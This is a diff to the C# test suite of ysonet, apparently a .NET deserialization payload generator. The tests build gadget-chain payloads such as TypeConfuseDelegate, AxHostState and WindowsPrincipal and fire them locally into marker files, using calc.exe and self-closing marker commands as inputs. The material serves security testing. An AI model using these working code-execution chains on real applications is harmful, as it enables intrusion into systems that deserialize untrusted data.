+        // system-drive root. Everything is compared against values derived on THIS machine,
+        // so the test carries no developer path and no assumed drive letter.
+        private static void TestArtifactDirOrdering()
+        {
+            var chain = new List<string>(TestArtifactDirCandidates());
+            AssertTrue(chain.Count >= 3, "the chain offers at least user temp, system Temp and the drive-root temp");
+
+            string ws = FindWorkspaceRoot();
+            AssertTrue(ws == null || File.Exists(Path.Combine(ws, "ysonet.sln")),
+                "FindWorkspaceRoot returns the folder holding ysonet.sln, or null off-checkout");
+            if (ws != null)
+                AssertEqual(Path.Combine(ws, "temp"), chain[0], "the workspace temp is tried first");
+
+            int i = ws == null ? 0 : 1;
+            AssertEqual(Path.GetTempPath(), chain[i], "the user temp is next");
+
+            string sysRoot = Environment.GetEnvironmentVariable("SystemRoot");
+            if (!string.IsNullOrEmpty(sysRoot))
+                AssertEqual(Path.Combine(sysRoot, "Temp"), chain[i + 1], "the system Temp is next");
+
+            string last = chain[chain.Count - 1];
+            string sysDrive = Path.GetPathRoot(string.IsNullOrEmpty(sysRoot) ? Environment.SystemDirectory : sysRoot);
+            AssertEqual(Path.Combine(sysDrive, "temp"), last, "the last resort is a temp at the system-drive root");
+            AssertTrue(last.StartsWith(sysDrive, StringComparison.OrdinalIgnoreCase),
+                "the last resort drive is derived, not hardcoded");
+
+            foreach (string dir in chain)
+                AssertTrue(!string.IsNullOrEmpty(dir) && Path.IsPathRooted(dir), "every candidate is a rooted path");
+        }
+
+        // The write walks the chain: it skips a candidate it cannot create, it treats a file
+        // that vanished right after the write (antivirus) as a miss and moves on, and when
+        // nothing works it fails loudly naming every location it tried.
+        private static void TestArtifactWriteFallsThrough()
+        {
+            string root = TestArtifactPath("ysonet_writefallthrough_test");
+            SafeDeleteDir(root);
+            Directory.CreateDirectory(root);
+            try
+            {
+                // A FILE where a candidate directory should be: CreateDirectory throws, so
+                // this candidate is skipped rather than taking the whole write down.
+                string blocked = Path.Combine(root, "blocked");
+                File.WriteAllText(blocked, "not a directory");
+                string good = Path.Combine(root, "good");
+
+                string written = WriteArtifactIn(new[] { blocked, good }, "ysonet_probe_fallthrough.txt", "x", null);
+                AssertEqual(Path.Combine(good, "ysonet_probe_fallthrough.txt"), written,
+                    "an unusable candidate is skipped and the next one is used");
+                AssertTrue(File.Exists(written), "the artifact really exists at the returned path");
+
+                // Antivirus case: the write succeeds, then the file is gone. The first
+                // candidate must be abandoned even though nothing threw.
+                string eaten = Path.Combine(root, "eaten");
+                string second = Path.Combine(root, "second");
+                Func<string, bool> avEatsTheFirst = delegate(string p)
+                {
+                    return !p.StartsWith(eaten, StringComparison.OrdinalIgnoreCase) && File.Exists(p);
+                };
+                string survivor = WriteArtifactIn(new[] { eaten, second }, "ysonet_probe_av.txt", "x", avEatsTheFirst);
+                AssertEqual(Path.Combine(second, "ysonet_probe_av.txt"), survivor,
+                    "a file that disappears after the write falls through to the next directory");
+
+                // Nothing usable: a setup failure that names what was tried, never a skip.
+                string missing = Path.Combine(root, "nope");
+                string caught = null;
+                try { WriteArtifactIn(new[] { blocked, missing }, "ysonet_probe_none.txt", "x", delegate { return false; }); }
+                catch (IOException ex) { caught = ex.Message; }
+                AssertTrue(caught != null, "an unwritable chain throws instead of skipping silently");
+                AssertTrue(caught.Contains("ysonet_probe_none.txt"), "the error names the artifact");
+                AssertTrue(caught.Contains(blocked) && caught.Contains(missing),
+                    "the error lists every location it tried");
+
+                // The real entry point resolves to a directory that exists and is writable.
+                string dir = ResolveTestArtifactDir();
+                AssertTrue(Directory.Exists(dir), "ResolveTestArtifactDir returns an existing directory");
+                AssertEqual(Path.Combine(dir, "ysonet_x.txt"), TestArtifactPath("ysonet_x.txt"),
+                    "TestArtifactPath builds on the resolved directory");
+            }
+            finally { SafeDeleteDir(root); }
+        }
+
+        // The sweep must remove only OLD "ysonet_*" entries. A fresh one belongs to a suite
+        // running right now and must survive, and nothing outside the naming scheme may be
+        // touched - the sweep runs against shared temp folders.
+        private static void StaleArtifactSweep()
+        {
+            string dir = TestArtifactPath("ysonet_sweep_test");
+            SafeDeleteDir(dir);
+            Directory.CreateDirectory(dir);
+            try
+            {
+                DateTime old = DateTime.UtcNow - TimeSpan.FromHours(5);
+
+                string staleFile = Path.Combine(dir, "ysonet_fire_stale.txt");
+                File.WriteAllText(staleFile, "x");
+                File.SetLastWriteTimeUtc(staleFile, old);
+
+                string staleDir = Path.Combine(dir, "ysonet_firedir_stale");
+                Directory.CreateDirectory(staleDir);
+                File.WriteAllText(Path.Combine(staleDir, "inside.txt"), "x");
+                Directory.SetLastWriteTimeUtc(staleDir, old);
+
+                string freshFile = Path.Combine(dir, "ysonet_fire_fresh.txt"); // a concurrent run
+                File.WriteAllText(freshFile, "x");
+
+                string wizardOut = Path.Combine(dir, "ysonet_payloads.txt");   // a user's own file
+                File.WriteAllText(wizardOut, "x");
+                File.SetLastWriteTimeUtc(wizardOut, old);
+
+                string foreign = Path.Combine(dir, "keepme.txt");
+                File.WriteAllText(foreign, "x");
+                File.SetLastWriteTimeUtc(foreign, old);
+
+                int removed = SweepStaleArtifacts(dir, TimeSpan.FromHours(1));
+
+                AssertTrue(removed == 2, "sweep reports the two stale entries it removed (got " + removed + ")");
+                AssertTrue(!File.Exists(staleFile), "a stale marker file is removed");
+                AssertTrue(!Directory.Exists(staleDir), "a stale sink folder is removed with its contents");
+                AssertTrue(File.Exists(freshFile), "a fresh artifact (a concurrent run) is kept");
+                AssertTrue(File.Exists(wizardOut), "the wizard's default ysonet_payloads output is kept");
+                AssertTrue(File.Exists(foreign), "a file outside the ysonet_ naming scheme is untouched");
+                AssertTrue(SweepStaleArtifacts(Path.Combine(dir, "no_such_dir"), TimeSpan.Zero) == 0,
+                    "a missing directory sweeps to zero instead of throwing");
+            }
+            finally { SafeDeleteDir(dir); }
         }
 
         // The gadget's own variant option token (--variant, or --internalgadget for
@@ -3763,6 +6982,16 @@ namespace ysonet.Tests
                 // (TextFormattingRunProperties) + SoapFormatter still generates.
                 { "DataTable|SoapFormatter|variant2",
                     "is not supported by variant 2" },
+                // The XML minifier is not text preserving (XmlXSLTMinifier trims text nodes,
+                // the XmlDocument round trip drops a CR). The two strings this gadget carries
+                // are user data the target uses literally, so the gadget verifies them after
+                // minification and refuses rather than delivering a rewritten file. The shared
+                // content fixture ends with a CRLF, so the minified NetDataContractSerializer
+                // cell of the write variant must be refused. BinaryFormatter and LosFormatter
+                // carry the string verbatim and are NOT listed here, which is the point: the
+                // limitation belongs to the XML minifier, not to the gadget.
+                { "TypeConfuseDelegateFileOperations|NetDataContractSerializer|variant1|minify",
+                    "cannot use --minify with NetDataContractSerializer" },
             };
 
             // Cells whose MINIFIED output is XML but intentionally NOT standalone well-formed,
@@ -3780,6 +7009,7 @@ namespace ysonet.Tests
             string csFixture = MakeTempFile("ysonet_matrix_fixture.cs",
                 "public class YsonetTestFixture { public YsonetTestFixture() { } }");
             string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
+            string contentFixture = ContentFixture();
 
             bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
             var failures = new List<string>();
@@ -3790,6 +7020,13 @@ namespace ysonet.Tests
                 foreach (string name in GadgetRegistry.GetAllGadgetNames())
                 {
                     if (name == "Generic") continue;
+                    // Same facet-derived exclusion as the normal-tier sweep: the
+                    // combination matrix never builds a denial-of-service payload.
+                    if (DosPolicy.IsDosGadget(name))
+                    {
+                        Console.Error.WriteLine("  [skip] matrix " + name + " (denial-of-service)");
+                        continue;
+                    }
                     if (trace) { Console.Error.WriteLine("  [matrix] " + name); Console.Error.Flush(); }
                     IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                     AssertTrue(g != null, "gadget loads: " + name);
@@ -3820,13 +7057,16 @@ namespace ysonet.Tests
                                 string expectedError = ExpectedGadgetFailure(expectedGadgetFailures, name, formatter, variant, minify);
 
                                 InputArgs ia = new InputArgs();
-                                ia.Cmd = SampleInputForGadget(inType, csFixture, dllFixture);
+                                ia.Cmd = SampleInputForGadget(inType, csFixture, dllFixture, contentFixture);
                                 ia.Minify = minify;
                                 ia.Test = false;
                                 // Pass the variant plus a xamlurl: the 3rd (SSRF) variant of
-                                // ObjectDataProvider (and WindowsClaimsIdentity, which reuses it)
-                                // needs a xamlurl, not a shell command; gadgets without that option
-                                // ignore the extra argument.
+                                // ObjectDataProvider needs a xamlurl, not a shell command; gadgets
+                                // without that option ignore the extra argument. Only ObjectDataProvider
+                                // itself needs it now - WindowsClaimsIdentity used to as well, because
+                                // its own --variant 3 leaked into the inner ObjectDataProvider; that
+                                // leak is fixed by GenerateInner, and
+                                // EveryVariantGeneratesFromTheVariantFlagAlone holds the line.
                                 var extra = new List<string>();
                                 if (variant != null) { extra.Add(variantFlag); extra.Add(variant.Number.ToString()); }
                                 extra.Add("--xamlurl"); extra.Add("http://127.0.0.1/x");
@@ -3884,14 +7124,16 @@ namespace ysonet.Tests
             finally
             {
                 try { File.Delete(csFixture); } catch { }
+                try { File.Delete(contentFixture); } catch { }
             }
 
             AssertTrue(cells > 100, "matrix exercised many cells (was " + cells + ")");
             // Three variant-scoped SoapFormatter-generics keys, each matching both minify
             // states = six required expected-failure cells (two of them the new DataTable
-            // variant-2 pair). This floor forces those cells to actually be reached and
-            // guarded, not merely sit unused in the dictionary.
-            AssertTrue(expectedFailures >= 6,
+            // variant-2 pair), plus the minify-only file-operations text-preservation cell.
+            // This floor forces those cells to actually be reached and guarded, not merely
+            // sit unused in the dictionary.
+            AssertTrue(expectedFailures >= 7,
                 "the known SoapFormatter-generics limitation cells were exercised (was " + expectedFailures + ")");
             AssertTrue(failures.Count == 0,
                 "gadget matrix cells failed (" + failures.Count + " of " + cells + "; " + expectedFailures + " expected-failures verified):\n  "
@@ -3918,6 +7160,89 @@ namespace ysonet.Tests
                 if (map.TryGetValue(k, out v)) return v;
             }
             return null;
+        }
+
+        // --rootcontainer is a plain option, not a variant, so the matrix above does not cross it
+        // (it crosses variants only). This is its own grid: for the TypeConfuseDelegate
+        // wrapper of both consumers, every container x every advertised formatter x minify
+        // off/on must produce a non-empty payload, and every container of one gadget must
+        // produce a DIFFERENT payload from the others so no cell silently falls back.
+        private static void XamlContainerFullMatrix()
+        {
+            var failures = new List<string>();
+            int cells = 0;
+
+            // ActivitySurrogateDisableTypeCheck ignores -c, so it gets the whole grid.
+            foreach (string formatter in XamlContainerFormatters)
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    var seen = new List<byte[]>();
+                    foreach (int container in new[] { 1, 2, 3 })
+                    {
+                        string cell = "ActivitySurrogateDisableTypeCheck -f " + formatter
+                            + " --rootcontainer " + container + (minify ? " (minify)" : "");
+                        cells++;
+                        RunResult r;
+                        try { r = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, formatter, minify); }
+                        catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }
+
+                        if (!r.Success) { failures.Add(cell + " -> " + r.ErrorMessage); continue; }
+                        if (RawIsEmpty(r.Raw)) { failures.Add(cell + " -> empty payload"); continue; }
+
+                        byte[] bytes = Bytes(r.Raw);
+                        foreach (byte[] earlier in seen)
+                            if (BytesEqual(earlier, bytes))
+                                failures.Add(cell + " -> produced the same bytes as an earlier container");
+                        seen.Add(bytes);
+                    }
+                }
+            }
+
+            // XamlAssemblyLoadFromFile compiles the .cs on EVERY generation, so it is scoped
+            // to BinaryFormatter x minify: the wrapper code path is identical to the grid
+            // above, and its runtime effect for containers 2 and 3 is fired for real in
+            // PayloadsFireIntoTestSinks.
+            string cs = MakeTempFile("ysonet_container_matrix.cs",
+                "public class YsonetContainerMatrix { public YsonetContainerMatrix() { } }");
+            try
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    foreach (int container in new[] { 1, 2, 3 })
+                    {
+                        string cell = "XamlAssemblyLoadFromFile -f BinaryFormatter --rootcontainer "
+                            + container + (minify ? " (minify)" : "");
+                        cells++;
+                        RunResult r;
+                        try { r = GenerateXamlContainer("XamlAssemblyLoadFromFile", cs, 1, container, "BinaryFormatter", minify); }
+                        catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }
+
+                        if (!r.Success) { failures.Add(cell + " -> " + r.ErrorMessage); continue; }
+                        if (RawIsEmpty(r.Raw)) { failures.Add(cell + " -> empty payload"); continue; }
+
+                        // The wire shape, checked here rather than in the normal tier: these
+                        // cells already pay for the compile. A byte comparison is impossible
+                        // (each compile embeds a fresh module id), so assert the chosen root.
+                        string text = Encoding.ASCII.GetString(Bytes(r.Raw));
+                        string wanted = container == 1 ? "System.Collections.Generic.SortedSet`1"
+                            : container == 2 ? "System.Collections.Generic.SortedDictionary`2"
+                            : "System.Collections.Generic.TreeSet`1";
+                        if (!text.Contains(wanted))
+                            failures.Add(cell + " -> does not serialize " + wanted);
+                        if (container != 1 && text.Contains("System.Collections.Generic.SortedSet`1"))
+                            failures.Add(cell + " -> still emits a SortedSet type record");
+                    }
+                }
+            }
+            finally { SafeDelete(cs); }
+
+            AssertTrue(cells == 24, "the container grid covered every cell (was " + cells + ")");
+            AssertTrue(failures.Count == 0,
+                "XAML container cells failed (" + failures.Count + " of " + cells + "):\n  "
+                + string.Join("\n  ", failures.ToArray()));
         }
 
         // ---- 6.5 output encodings per formatter ----
@@ -4048,7 +7373,7 @@ namespace ysonet.Tests
 
             // One bridged chain must actually execute end to end: TypeConfuseDelegate
             // wrapped in AxHostState, fired via BinaryFormatter into a marker sink.
-            string marker = Path.Combine(Path.GetTempPath(), "ysonet_bgc_fire.txt");
+            string marker = TestArtifactPath("ysonet_bgc_fire.txt");
             if (File.Exists(marker)) File.Delete(marker);
             try
             {
@@ -4066,7 +7391,7 @@ namespace ysonet.Tests
                 });
                 AssertTrue(fr.Success && fr.Raw is byte[], "bridged chain generated for firing: " + fr.ErrorMessage);
                 RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
-                AssertTrue(WaitForFile(marker, 2500), "the bridged chain TypeConfuseDelegate,AxHostState fired end to end");
+                AssertTrue(WaitForFile(marker, MarkerWaitMs), "the bridged chain TypeConfuseDelegate,AxHostState fired end to end");
             }
             finally
             {
@@ -4077,7 +7402,7 @@ namespace ysonet.Tests
             // TypeConfuseDelegate wrapped in WindowsPrincipal, via BinaryFormatter. This
             // proves the bridged BF blob reaches and fires from the inner ClaimsIdentity's
             // bootstrapContext, the whole point of making WindowsPrincipal a bridge.
-            string wpMarker = Path.Combine(Path.GetTempPath(), "ysonet_bgc_wp_fire.txt");
+            string wpMarker = TestArtifactPath("ysonet_bgc_wp_fire.txt");
             if (File.Exists(wpMarker)) File.Delete(wpMarker);
             try
             {
@@ -4095,7 +7420,7 @@ namespace ysonet.Tests
                 });
                 AssertTrue(fr.Success && fr.Raw is byte[], "WindowsPrincipal bridged chain generated for firing: " + fr.ErrorMessage);
                 RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
-                AssertTrue(WaitForFile(wpMarker, 2500), "the bridged chain TypeConfuseDelegate,WindowsPrincipal fired end to end");
+                AssertTrue(WaitForFile(wpMarker, MarkerWaitMs), "the bridged chain TypeConfuseDelegate,WindowsPrincipal fired end to end");
             }
             finally
             {
@@ -4189,7 +7514,7 @@ namespace ysonet.Tests
                 });
                 AssertTrue(r.Success && r.Raw is byte[], "bridged chain generated (minify=" + minify + "): " + r.ErrorMessage);
                 RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
-                AssertTrue(WaitForFile(marker, 2500), "bridged TypeConfuseDelegate,AxHostState fired (minify=" + minify + ")");
+                AssertTrue(WaitForFile(marker, MarkerWaitMs), "bridged TypeConfuseDelegate,AxHostState fired (minify=" + minify + ")");
             }
             finally { SafeDelete(marker); }
         }
@@ -4291,7 +7616,7 @@ namespace ysonet.Tests
                         InputArgs = ia,
                     });
                 });
-                return WaitForFile(marker, 3000);
+                return WaitForFile(marker, MarkerWaitMs);
             }
             finally { SafeDelete(marker); }
         }
@@ -4341,7 +7666,7 @@ namespace ysonet.Tests
             string tpqpInner = MakeTempFile("ysonet_pmatrix_tpqp.json", "{}");
             string csFixture = MakeTempFile("ysonet_pmatrix_fixture.cs",
                 "public class YsonetTestFixture { public YsonetTestFixture() { } }");
-            string resxOut = Path.Combine(Path.GetTempPath(), "ysonet_pmatrix.resources");
+            string resxOut = TestArtifactPath("ysonet_pmatrix.resources");
 
             var rows = new List<PluginCell>
             {
@@ -4360,16 +7685,6 @@ namespace ysonet.Tests
                 new PluginCell("GetterCallGadgets", new[] { "-g", "ComboBox", "-m", "Items", "-i", innerJson }),
 
                 new PluginCell("MachineKeySessionSecurityTokenHandler", new[] { "-c", "calc.exe", "--validationkey", vk, "--decryptionkey", dk }),
-
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" }).Shrinks(),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "PictureBox", "-f", "Xaml", "-i", "http://localhost/y" }).Shrinks(),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Json.NET", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "InfiniteProgressPage", "-f", "Xaml", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Json.NET", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "JavaScriptSerializer", "-i", "http://localhost/y" }),
-                new PluginCell("NetNonRceGadgets", new[] { "-g", "FileLogTraceListener", "-f", "Xaml", "-i", "http://localhost/y" }),
 
                 new PluginCell("Resx", new[] { "-M", "BinaryFormatter", "-c", "calc.exe" }).Shrinks(),
                 new PluginCell("Resx", new[] { "-M", "SoapFormatter", "-c", csFixture }),
@@ -4571,7 +7886,7 @@ namespace ysonet.Tests
 
         private static string MarkerPath(string tag)
         {
-            return Path.Combine(Path.GetTempPath(), "ysonet_fire_" + tag + ".txt");
+            return TestArtifactPath("ysonet_fire_" + tag + ".txt");
         }
 
         // A self-closing marker command: cmd /c echo x > "marker". Works whether or not
@@ -4601,6 +7916,7 @@ namespace ysonet.Tests
         private static void FireGadgetSelfTest(string gadget, string formatter, string reasonIfSkipped,
             List<string> failures, ref int fired, ref int skipped, bool trace)
         {
+            if (RefuseToFireDosGadget(gadget, failures)) return;
             string marker = MarkerPath(gadget + "_selftest");
             SafeDelete(marker);
             if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " (self-test)"); Console.Error.Flush(); }
@@ -4620,11 +7936,76 @@ namespace ysonet.Tests
                         InputArgs = ia,
                     });
                 });
-                if (WaitForFile(marker, 3000)) fired++;
+                if (WaitForFile(marker, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(gadget); }
                 else { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): marker not created - " + reasonIfSkipped); }
             }
             catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire " + gadget + " (self-test): " + ex.Message); }
             finally { SafeDelete(marker); }
+        }
+
+        // Last-line defense for the execution matrix: a denial-of-service payload must
+        // never be deserialized here, because it would disrupt or terminate the test
+        // runner itself. The rows inside PayloadsFireIntoTestSinks are local variables
+        // that no separate coverage test can inspect, so the guard sits at the three
+        // generic fire helpers every row goes through. This is a hard failure, not a
+        // skip: an accidental DoS row is a mistake to fix, not a case to tolerate. The
+        // --dos opt-in deliberately does NOT unlock this; nothing in the suite fires a
+        // DoS payload.
+        private static bool RefuseToFireDosGadget(string gadget, List<string> failures)
+        {
+            if (!DosPolicy.IsDosGadget(gadget))
+                return false;
+            failures.Add("fire " + gadget + ": denial-of-service gadgets must never be added to a fire list");
+            return true;
+        }
+
+        // Run one payload through the deserializer named by the caller's short tag.
+        //
+        // A gadget's Raw comes back as either a string or a byte[] depending on how it built
+        // the payload: the ones that hand-build XML/JSON return a string, the ones that go
+        // through the base GenericGenerator.Serialize return the serialized bytes. The two
+        // shapes are normalized HERE, once, instead of in every call site's cast. That
+        // matters because RunSTA swallows exceptions on purpose (most gadgets throw AFTER
+        // firing), so a bad cast here is invisible and looks exactly like a payload that did
+        // not fire. Text() decodes bytes for the string-taking helpers; Bytes() re-encodes a
+        // string for the byte-taking ones. An unknown tag is a hard error, not a silent no-op.
+        private static void DeserializeAs(string deserAs, object raw)
+        {
+            switch (deserAs)
+            {
+                case "bf": SerializersHelper.BinaryFormatter_deserialize(Bytes(raw)); break;
+                case "los": SerializersHelper.LosFormatter_deserialize(Bytes(raw)); break;
+                case "xaml": SerializersHelper.Xaml_deserialize(Text(raw)); break;
+                case "json": SerializersHelper.JsonNet_deserialize(Text(raw)); break;
+                case "ndc": SerializersHelper.NetDataContractSerializer_deserialize(Text(raw)); break;
+                case "dcs": SerializersHelper.DataContractSerializer_deserialize(Text(raw), null, "root", "type"); break;
+                case "soap": SerializersHelper.SoapFormatter_deserialize(Text(raw)); break;
+                default: throw new Exception("unknown deserializer tag: " + deserAs);
+            }
+        }
+
+        // Payload as text. Every formatter that produces a text document writes UTF-8, and
+        // UTF8.GetString also round-trips plain ASCII (the SOAP case), so one decode covers
+        // all of them.
+        private static string Text(object raw)
+        {
+            if (raw == null) throw new Exception("payload is null");
+            byte[] bytes = raw as byte[];
+            if (bytes != null) return Encoding.UTF8.GetString(bytes);
+            string s = raw as string;
+            if (s != null) return s;
+            throw new Exception("payload is neither string nor byte[], but " + raw.GetType().Name);
+        }
+
+        // Payload as bytes, for the binary deserializers.
+        private static byte[] Bytes(object raw)
+        {
+            if (raw == null) throw new Exception("payload is null");
+            byte[] bytes = raw as byte[];
+            if (bytes != null) return bytes;
+            string s = raw as string;
+            if (s != null) return Encoding.UTF8.GetBytes(s);
+            throw new Exception("payload is neither string nor byte[], but " + raw.GetType().Name);
         }
 
         // Generate the gadget's own payload with a marker command, deserialize it
@@ -4634,6 +8015,7 @@ namespace ysonet.Tests
             bool minify, bool useSimpleType, string deserAs, bool required,
             List<string> failures, ref int fired, ref int skipped, bool trace)
         {
+            if (RefuseToFireDosGadget(gadget, failures)) return;
             string tag = gadget + "_" + formatter + (variant > 0 ? "_v" + variant : "") + (minify ? "_m" : "") + (useSimpleType ? "_u" : "");
             string marker = MarkerPath(tag);
             SafeDelete(marker);
@@ -4664,20 +8046,9 @@ namespace ysonet.Tests
                     return;
                 }
 
-                RunSTA(delegate
-                {
-                    if (deserAs == "bf") SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw);
-                    else if (deserAs == "xaml") SerializersHelper.Xaml_deserialize((string)r.Raw);
-                    else if (deserAs == "json") SerializersHelper.JsonNet_deserialize((string)r.Raw);
-                    else if (deserAs == "ndc") SerializersHelper.NetDataContractSerializer_deserialize((string)r.Raw);
-                    // Soap/Los Serialize both return a byte[] (SOAP XML bytes, and the
-                    // Los base64 stream). Decode SOAP to a string for its helper; Los has
-                    // a byte[] overload. Used by the DataTable carrier marker checks.
-                    else if (deserAs == "soap") SerializersHelper.SoapFormatter_deserialize(System.Text.Encoding.ASCII.GetString((byte[])r.Raw));
-                    else if (deserAs == "los") SerializersHelper.LosFormatter_deserialize((byte[])r.Raw);
-                });
+                RunSTA(delegate { DeserializeAs(deserAs, r.Raw); });
 
-                if (WaitForFile(marker, 3000)) fired++;
+                if (WaitForFile(marker, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(gadget); }
                 else
                 {
                     string msg = "fire " + tag + ": marker not created";
@@ -4717,7 +8088,22 @@ namespace ysonet.Tests
         // Assembly.Load and run the compiled type after decompressing, just like the plain form.
         private static void FireSelfClosingCs(string gadget, List<string> failures, ref int fired, ref int skipped, bool trace, bool minify, bool compressed)
         {
-            string label = gadget + (minify ? " (minify)" : "") + (compressed ? " (compressed)" : "");
+            FireSelfClosingCs(gadget,
+                (minify ? " --minify" : "") + (compressed ? " --compressed" : ""),
+                (minify ? "min_" : "") + (compressed ? "c_" : ""),
+                (minify ? " (minify)" : "") + (compressed ? " (compressed)" : ""),
+                failures, ref fired, ref skipped, trace);
+        }
+
+        // The general form: fire with any EXTRA gadget options (for example "--rootcontainer 2"),
+        // which the boolean overloads above cannot express. tag keeps the marker and the .cs
+        // fixture distinct per row, so a red test is unambiguous and two rows for one gadget
+        // never share files.
+        private static void FireSelfClosingCs(string gadget, string extraArgs, string tag, string labelSuffix,
+            List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            if (RefuseToFireDosGadget(gadget, failures)) return;
+            string label = gadget + labelSuffix;
             string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
             if (!File.Exists(exe))
             {
@@ -4726,18 +8112,17 @@ namespace ysonet.Tests
                 return;
             }
 
-            // Distinct marker/cs per minify state so a red test is unambiguous and the two
-            // fires for one gadget never share files.
-            string marker = MarkerPath(gadget + (minify ? "_min" : "") + (compressed ? "_c" : "") + "_selfcs");
-            string cs = Path.Combine(Path.GetTempPath(), "ysonet_selfcs_" + (minify ? "min_" : "") + (compressed ? "c_" : "") + gadget + ".cs");
+            // Distinct marker/cs per row so a red test is unambiguous and two fires for one
+            // gadget never share files.
+            string marker = MarkerPath(gadget + "_" + tag + "selfcs");
             SafeDelete(marker);
-            File.WriteAllText(cs, "public class E { public E() { System.IO.File.WriteAllText(@\"" + marker + "\", \"x\"); } }");
+            string cs = WriteTestArtifact("ysonet_selfcs_" + tag + gadget + ".cs",
+                "public class E { public E() { System.IO.File.WriteAllText(@\"" + marker + "\", \"x\"); } }");
             if (trace) { Console.Error.WriteLine("    [fire] " + label + " (self-cs subprocess)"); Console.Error.Flush(); }
             try
             {
-                string extra = (minify ? " --minify" : "") + (compressed ? " --compressed" : "");
                 var psi = new System.Diagnostics.ProcessStartInfo(exe,
-                    "-g " + gadget + " -f BinaryFormatter -c \"" + cs + "\" -t" + extra);
+                    "-g " + gadget + " -f BinaryFormatter -c \"" + cs + "\" -t" + extraArgs);
                 psi.UseShellExecute = false;
                 psi.CreateNoWindow = true;
                 psi.RedirectStandardOutput = true;
@@ -4751,7 +8136,7 @@ namespace ysonet.Tests
                     proc.BeginErrorReadLine();
                     if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                 }
-                if (WaitForFile(marker, 2000)) fired++;
+                if (WaitForFile(marker, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired(gadget); }
                 else failures.Add("fire " + label + " (self-cs subprocess): marker not created");
             }
             catch (Exception ex) { failures.Add("fire " + label + " (self-cs): " + ex.Message); }
@@ -4772,7 +8157,7 @@ namespace ysonet.Tests
                 IPlugin instance = PluginRegistry.CreatePluginInstance(plugin);
                 ResetPluginStatics(instance == null ? null : instance.GetType());
                 RunSTA(delegate { PayloadRunner.RunPlugin(plugin, argv.ToArray()); });
-                if (WaitForFile(marker, 3500)) fired++;
+                if (WaitForFile(marker, MarkerWaitMs)) fired++;
                 else failures.Add("fire plugin " + plugin + " " + string.Join(" ", baseArgv) + ": marker not created");
             }
             catch (Exception ex) { failures.Add("fire plugin " + plugin + ": " + ex.Message); }
@@ -4792,7 +8177,7 @@ namespace ysonet.Tests
                 return;
             }
             string marker = MarkerPath("plugin_Resx_compiled");
-            string resxOut = Path.Combine(Path.GetTempPath(), "ysonet_fire.resources");
+            string resxOut = TestArtifactPath("ysonet_fire.resources");
             SafeDelete(marker); SafeDelete(resxOut);
             if (trace) { Console.Error.WriteLine("    [fire] plugin Resx compileddotresources (subprocess)"); Console.Error.Flush(); }
             try
@@ -4813,7 +8198,7 @@ namespace ysonet.Tests
                     proc.BeginErrorReadLine();
                     if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
                 }
-                if (WaitForFile(marker, 2000)) fired++;
+                if (WaitForFile(marker, MarkerWaitMs)) fired++;
                 else failures.Add("fire plugin Resx compileddotresources (subprocess): marker not created");
             }
             catch (Exception ex) { failures.Add("fire plugin Resx compileddotresources: " + ex.Message); }
@@ -4832,12 +8217,69 @@ namespace ysonet.Tests
             {
                 "TextFormattingRunProperties", "TypeConfuseDelegate",
                 "AxHostState", "DataSet", "DataSetTypeSpoof", "DataSetOldBehaviour",
-                "ClaimsIdentity", "ClaimsPrincipal", "GenericPrincipal", "RolePrincipal",
+                "ClaimsIdentity", "ClaimsPrincipal", "GenericPrincipal", "GenericIdentity", "FormsIdentity", "RolePrincipal",
                 "SessionSecurityToken", "SessionViewStateHistoryItem", "ToolboxItemContainer",
                 "WindowsIdentity", "WindowsPrincipal", "ResourceSet", "DataTable",
             };
             foreach (string g in bfMarkerGadgets)
                 FireGadgetMarker(g, "BinaryFormatter", 0, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+
+            // ---- MARKER: GenericIdentity carrier across its OTHER advertised formatters.
+            // Like ClaimsIdentity, GenericIdentity advertises BinaryFormatter, SoapFormatter
+            // and LosFormatter. Its BinaryFormatter cell (raw and minified) is covered by
+            // bfMarkerGadgets membership above and the minified loop below. The four cells
+            // here complete the matrix for Soap and Los, raw and minified. The inner gadget
+            // is TFRP, which fires Process.Start then throws a cast error AFTER firing; the
+            // marker file (not a clean return) is the proof of execution. Any cell that does
+            // not fire is a real bug to investigate, never a skip.
+            FireGadgetMarker("GenericIdentity", "SoapFormatter", 0, false, false, "soap", true, failures, ref fired, ref skipped, trace);
